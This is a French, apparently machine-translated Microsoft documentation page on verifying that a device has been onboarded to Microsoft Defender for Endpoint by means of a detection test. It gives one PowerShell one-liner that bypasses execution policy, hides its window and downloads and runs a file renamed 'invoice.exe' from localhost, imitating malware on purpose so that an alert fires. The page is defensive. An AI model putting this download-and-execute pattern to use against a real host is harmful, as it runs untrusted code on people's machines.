---
title: Exécuter un test de détection sur un appareil pour vérifier qu’il a été correctement intégré à Microsoft Defender pour le point de terminaison
description: Exécutez le script de test de détection sur un appareil récemment intégré au service Microsoft Defender for Endpoint pour vérifier qu’il est correctement ajouté.
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
ms.author: macapara
author: mjcaparas
localization_priority: Normal
manager: dansimp
audience: ITPro
ms.collection:
- m365-security-compliance
- m365initiative-defender-endpoint
ms.topic: article
ms.technology: mde
ms.openlocfilehash: 11b7339dce44d3fb55593e7b54a5d38982f957cd
ms.sourcegitcommit: e5de03d4bd669945fec0d25a3f5eae56f86c9dcc
ms.translationtype: MT
ms.contentlocale: fr-FR
ms.lasthandoff: 10/01/2021
ms.locfileid: "60043298"
---
# <a name="run-a-detection-test-on-a-newly-onboarded-microsoft-defender-for-endpoint-device"></a>Exécuter un test de détection sur un appareil Microsoft Defender pour point de terminaison nouvellement intégré

[!INCLUDE [Microsoft 365 Defender rebranding](../../includes/microsoft-defender.md)]


**S’applique à :**
- Versions Windows 10 pris en charge
- Windows Server 2012 R2
- Windows Server 2016
- Windows Serveur, version 1803
- Windows Server 2019
- Windows Server 2022
- [Microsoft Defender pour point de terminaison](https://go.microsoft.com/fwlink/?linkid=2154037)
- [Microsoft 365 Defender](https://go.microsoft.com/fwlink/?linkid=2118804)

> Vous voulez découvrir Microsoft Defender pour point de terminaison ? [Inscrivez-vous pour bénéficier d’un essai gratuit.](https://signup.microsoft.com/create-account/signup?products=7f379fee-c4f9-4278-b0a1-e4c8c2fcdf7e&ru=https://aka.ms/MDEp2OpenTrial?ocid=docs-wdatp-exposedapis-abovefoldlink)

Lorsque vous ajoutez un appareil au service Microsoft Defender for Endpoint pour la gestion, il s’agit également d’appareils d’intégration. L’intégration permet aux appareils de signaler des signaux sur leur état d’état au service.

La vérification ou la vérification de l’ajout réussi d’un appareil au service est une étape essentielle de l’ensemble du processus de déploiement. Il garantit que tous les appareils attendus sont gérés. 

## <a name="verify-microsoft-defender-for-endpoint-onboarding-of-a-device-using-a-powershell-detection-test"></a>Vérifier l’intégration de Microsoft Defender pour endpoint d’un appareil à l’aide d’un test de détection PowerShell

Exécutez le script PowerShell suivant sur un appareil nouvellement intégré pour vérifier qu’il est correctement signalé au service Defender for Endpoint.

1. Créez un dossier : « C:\test-MDATP-test ».
2. Ouvrez une invite de ligne de commande avec élévation de niveaux sur l’appareil et exécutez le script :

   1. Accéder à **Démarrer** et taper **cmd**.

   1. Cliquez avec le bouton droit **sur Invite de** commandes et **sélectionnez Exécuter en tant qu’administrateur.**

      ![Fenêtre menu Démarrer pointant sur Exécuter en tant qu’administrateur.](images/run-as-admin.png)

3. À l’invite, copiez et exécutez la commande suivante :

   ```powershell
   powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference = 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-MDATP-test\\invoice.exe');Start-Process 'C:\\test-MDATP-test\\invoice.exe'
   ```

La fenêtre d’invite de commandes se ferme automatiquement. Si elle réussit, le test de détection est marqué comme terminé et une nouvelle alerte s’affiche dans le portail pour l’appareil intégré dans environ 10 minutes.

## <a name="related-topics"></a>Voir aussi

- [Intégrer des appareils Windows 10](configure-endpoints.md)
- [Serveurs intégrés](configure-server-endpoints.md)
- [Résoudre les problèmes d’intégration de Microsoft Defender pour les points de terminaison](/microsoft-365/security/defender-endpoint/troubleshoot-onboarding)
